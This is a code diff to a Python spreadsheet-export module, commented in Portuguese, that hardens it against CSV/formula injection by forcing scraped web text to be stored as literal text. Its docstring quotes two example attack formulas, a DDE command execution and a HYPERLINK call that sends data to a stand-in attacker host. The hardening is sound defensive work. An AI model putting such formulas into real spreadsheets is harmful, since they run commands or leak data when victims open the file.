@@ -21,6 +21,7 @@ from io import BytesIO
 from typing import Optional
 
 from openpyxl import Workbook
+from openpyxl.cell.cell import ILLEGAL_CHARACTERS_RE
 
 logger = logging.getLogger(__name__)
 from openpyxl.styles import (
@@ -32,7 +33,7 @@ from openpyxl.styles import (
 )
 from openpyxl.utils import get_column_letter
 
-from models import KeywordStatus, NormativoResult, redigir, rotulo_status
+from models import KeywordStatus, NormativoResult, rotulo_status
 
 # ---------------------------------------------------------------------------
 # Style constants
@@ -109,6 +110,28 @@ DIAGNOSTICO_COLUMNS = [
 # Maximum ementa length in Excel cells. Longer values are truncated to
 # prevent workbook bloat and cell rendering issues in older Excel versions.
 _MAX_EMENTA_LENGTH = 5000
+
+
+# ---------------------------------------------------------------------------
+# Helper: texto nunca vira formula
+# ---------------------------------------------------------------------------
+
+
+def _forcar_texto(cell) -> None:
+    """Grava a celula como TEXTO, com o valor intacto — nunca como formula.
+
+    O openpyxl marca data_type='f' para qualquer str que comeca com '='; ao
+    abrir o .xlsx o Excel executaria '=cmd|"/c calc"!A0' (DDE) ou
+    '=HYPERLINK("http://evil.example/"&A1,...)' (exfiltracao). nome e ementa
+    vem de pagina web (Google: nome = titulo ou URL, ementa = snippet), logo
+    controlaveis por terceiros (revisao final de seguranca, S-SEC, critico).
+    Forcar data_type='s' DEPOIS de atribuir grava <c t="inlineStr"> com o
+    texto literal — sem apostrofo na frente: texto normativo NUNCA e alterado
+    (CLAUDE.md), e o apostrofo do redigir() apareceria na celula.
+    Chamar DEPOIS de `cell.value = ...` (a atribuicao recalcula o tipo).
+    """
+    if isinstance(cell.value, str):
+        cell.data_type = "s"
 
 
 # ---------------------------------------------------------------------------
@@ -290,6 +313,9 @@ def _write_data_row(ws, row_idx: int, item: NormativoResult) -> None:
             cell.alignment = DATA_ALIGNMENT
 
         cell.border = THIN_BORDER
+        # S-SEC: toda coluna de texto (nome, ementa, link, tipo, numero, data,
+        # orgao, categoria, situacao, origem) — num ponto so, depois de cada ramo
+        _forcar_texto(cell)
 
 
 # ---------------------------------------------------------------------------
@@ -323,13 +349,19 @@ def _write_diagnostico_sheet(wb, topic: str, diagnostico: Optional[list[KeywordS
         return
     sim_nao = lambda b: "Sim" if b else "Não"
     for row, s in enumerate(diagnostico, start=3):
-        # keyword e source vem do usuario/LLM: '=1+1' viraria formula (R3); redigir neutraliza
-        valores = [redigir(s.source), redigir(s.keyword), STATUS_LABEL(s), s.motivo or VAZIO,
+        # keyword e source vem do usuario/LLM: '=1+1' viraria formula (R3). Vao LITERAIS
+        # (revisao final, N8): redigir() trocava 'token=x' por 'token=***' e punha "'"
+        # na frente de '=' — a keyword gravada nao era a buscada. A formula e
+        # neutralizada por _forcar_texto; so saem os chars de controle que o
+        # openpyxl recusa (IllegalCharacterError derrubaria a exportacao).
+        valores = [ILLEGAL_CHARACTERS_RE.sub("", s.source or ""), ILLEGAL_CHARACTERS_RE.sub("", s.keyword or ""),
+                   STATUS_LABEL(s), s.motivo or VAZIO,
                    (s.detalhe or s.error_message) or VAZIO, s.result_count, sim_nao(s.parcial), sim_nao(s.retried)]
         for col, v in enumerate(valores, start=1):
             c = ws.cell(row=row, column=col)
             c.value, c.font, c.border = v, DATA_FONT, THIN_BORDER
             c.alignment = EMENTA_ALIGNMENT if col == 5 else DATA_ALIGNMENT
+            _forcar_texto(c)
     ws.freeze_panes = "A3"
     ws.auto_filter.ref = f"A2:{get_column_letter(n)}{len(diagnostico) + 2}"
 
@@ -426,8 +458,9 @@ def generate_excel(
 
     # ----------------------------------------------------------------
     # Sheet 2: Diagnostico da busca (always present). redigir NAO e
-    # reaplicada a detalhe/error_message: o KeywordStatus ja redigiu
-    # (source/keyword sao redigidos dentro da funcao).
+    # reaplicada a detalhe/error_message: o KeywordStatus ja redigiu.
+    # source/keyword NAO sao redigidos (revisao final, N8): vao literais,
+    # com a formula neutralizada por _forcar_texto dentro da funcao.
     # ----------------------------------------------------------------
     _write_diagnostico_sheet(wb, topic, diagnostico, quando)
     wb.active = 0  # garante 'Normativos' como aba ativa
